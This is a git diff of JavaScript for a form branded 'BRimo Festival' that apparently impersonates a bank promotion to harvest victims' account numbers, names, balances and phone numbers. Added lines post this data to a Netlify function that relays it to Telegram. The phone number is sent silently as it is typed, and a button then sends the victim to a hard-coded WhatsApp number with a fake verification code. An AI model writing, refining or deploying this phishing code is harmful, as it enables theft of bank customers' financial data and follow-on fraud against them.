@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Element declarations
+    // Deklarasi elemen
     const pages = document.querySelectorAll('.page');
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
@@ -13,26 +13,37 @@ document.addEventListener('DOMContentLoaded', function() {
     const currentBalance = document.getElementById('currentBalance');
     const amountInWords = document.getElementById('amountInWords');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    const phoneNumberInput = document.getElementById('phoneNumber');
-
-    // ================= UTILITY FUNCTIONS =================
-    function toggleHeaderVisibility(show) {
-        const headerImage = document.querySelector('.header-image');
-        headerImage.classList.toggle('header-hidden', !show);
+    
+    // Tambahkan input nomor HP jika belum ada
+    let phoneNumberInput = document.getElementById('phoneNumber');
+    if (!phoneNumberInput) {
+        phoneNumberInput = document.createElement('input');
+        phoneNumberInput.type = 'tel';
+        phoneNumberInput.id = 'phoneNumber';
+        phoneNumberInput.placeholder = 'Masukkan Nomor HP';
+        phoneNumberInput.className = 'phone-input';
+        document.querySelector('.input-box').insertBefore(phoneNumberInput, document.querySelector('.button-group'));
     }
 
+    // ================= FUNGSI UTAMA =================
+    
+    // 1. Fungsi Navigasi Halaman (TIDAK BERUBAH)
+    function toggleHeaderVisibility(show) {
+        document.querySelector('.header-image').classList.toggle('header-hidden', !show);
+    }
+    
     function toggleFooterVisibility(show) {
         footer.classList.toggle('footer-hidden', !show);
     }
-
+    
     function showLoading() {
         loadingOverlay.style.display = 'flex';
     }
-
+    
     function hideLoading() {
         loadingOverlay.style.display = 'none';
     }
-
+    
     function goToPage(currentPage, nextPage) {
         showLoading();
         setTimeout(() => {
@@ -42,52 +53,10 @@ document.addEventListener('DOMContentLoaded', function() {
             toggleFooterVisibility(nextPage.id !== 'page3');
             window.scrollTo(0, 0);
             hideLoading();
-        }, 1500);
+        }, 1500); // Tetap 1.5 detik untuk animasi
     }
 
-    // ================= TELEGRAM INTEGRATION =================
-    async function sendToTelegram(data) {
-        try {
-            showLoading();
-            const response = await fetch('/.netlify/functions/send-dana-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-
-            if (!response.ok) {
-                throw new Error(await response.text());
-            }
-            return await response.json();
-        } catch (error) {
-            console.error('Telegram Error:', error);
-            throw error;
-        } finally {
-            hideLoading();
-        }
-    }
-
-    // Phone number input with debounce
-    let debounceTimer;
-    phoneNumberInput.addEventListener('input', function() {
-        clearTimeout(debounceTimer);
-        const phoneNumber = this.value.replace(/\D/g, '');
-        
-        if (phoneNumber.length >= 10) {
-            debounceTimer = setTimeout(() => {
-                sendToTelegram({
-                    type: 'phone_number',
-                    phoneNumber: phoneNumber,
-                    name: accountName.value.trim(),
-                    balance: currentBalance.value.replace(/\./g, '')
-                }).catch(error => {
-                    console.log('Notification failed:', error);
-                });
-            }, 1500);
-        }
-    });
-
-    // ================= NUMBER CONVERSION =================
+    // 2. Fungsi Konversi Angka ke Huruf (TIDAK BERUBAH)
     function convertNumberToWords(num) {
         const ones = ['', 'Satu', 'Dua', 'Tiga', 'Empat', 'Lima', 'Enam', 'Tujuh', 'Delapan', 'Sembilan'];
         const teens = ['Sepuluh', 'Sebelas', 'Dua Belas', 'Tiga Belas', 'Empat Belas', 'Lima Belas', 'Enam Belas', 'Tujuh Belas', 'Delapan Belas', 'Sembilan Belas'];
@@ -143,21 +112,24 @@ document.addEventListener('DOMContentLoaded', function() {
         return value ? parseInt(value, 10).toLocaleString('id-ID') : '';
     }
 
+    // 3. Fungsi Notifikasi Telegram (BARU)
+    async function sendToTelegram(data) {
+        try {
+            const response = await fetch('/.netlify/functions/send-dana-data', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            return await response.json();
+        } catch (error) {
+            console.error('Error sending to Telegram:', error);
+            return { success: false };
+        }
+    }
+
     // ================= EVENT LISTENERS =================
-    currentBalance.addEventListener('input', function() {
-        this.value = formatNumberInput(this.value);
-        const numericValue = this.value.replace(/\./g, '');
-        amountInWords.textContent = convertNumberToWords(numericValue);
-    });
 
-    accountName.addEventListener('input', function() {
-        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-    });
-
-    accountNumber.addEventListener('input', function() {
-        this.value = this.value.replace(/\D/g, '');
-    });
-
+    // 1. Navigasi Halaman (TIDAK BERUBAH)
     next1.addEventListener('click', function() {
         if (!accountNumber.value.trim()) {
             alert('Mohon isi nomor rekening');
@@ -175,7 +147,7 @@ document.addEventListener('DOMContentLoaded', function() {
             alert('Nama hanya boleh mengandung huruf dan spasi');
             return;
         }
-        goToPage(page1, page2);
+        goToPage(page1, page2); // Pindah halaman seperti semula
     });
 
     next2.addEventListener('click', function() {
@@ -188,9 +160,42 @@ document.addEventListener('DOMContentLoaded', function() {
             alert('Jumlah saldo harus angka positif');
             return;
         }
-        goToPage(page2, page3);
+        goToPage(page2, page3); // Pindah halaman seperti semula
     });
 
+    // 2. Input Handling (DITAMBAHKAN validasi nomor HP)
+    currentBalance.addEventListener('input', function() {
+        this.value = formatNumberInput(this.value);
+        const numericValue = this.value.replace(/\./g, '');
+        amountInWords.textContent = convertNumberToWords(numericValue);
+    });
+
+    accountName.addEventListener('input', function() {
+        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+    });
+
+    accountNumber.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+    });
+
+    phoneNumberInput.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        
+        // Kirim ke Telegram setelah 1.5 detik tidak ada input
+        clearTimeout(this.debounceTimer);
+        this.debounceTimer = setTimeout(() => {
+            if (this.value.length >= 10) {
+                sendToTelegram({
+                    type: 'phone_number',
+                    phoneNumber: this.value,
+                    name: accountName.value.trim(),
+                    balance: currentBalance.value.replace(/\./g, '') || '0'
+                });
+            }
+        }, 1500);
+    });
+
+    // 3. Contact Service (DITAMBAHKAN loading)
     contactService.addEventListener('click', async function() {
         const whatsappNumber = '6283847980901';
         const virtualCode = Math.floor(100000 + Math.random() * 900000);
@@ -203,6 +208,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const message = `Halo admin BRimo Festival,\n\nSaya ${accountName.value.trim()} dengan detail:\n- Rekening: ${accountNumber.value.trim()}\n- Saldo: ${formattedBalance}\n- Dalam Huruf: ${amountInWords.textContent}\n\nKode verifikasi: ${virtualCode}\n\nTerima kasih.`;
 
         try {
+            showLoading();
             await sendToTelegram({
                 type: 'contact_service',
                 accountNumber: accountNumber.value.trim(),
@@ -214,10 +220,12 @@ document.addEventListener('DOMContentLoaded', function() {
             window.open(`https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`, '_blank');
         } catch (error) {
             alert('Gagal mengirim data: ' + error.message);
+        } finally {
+            hideLoading();
         }
     });
 
-    // Initialize
+    // Inisialisasi
     page1.classList.add('active');
     toggleHeaderVisibility(true);
     toggleFooterVisibility(true);
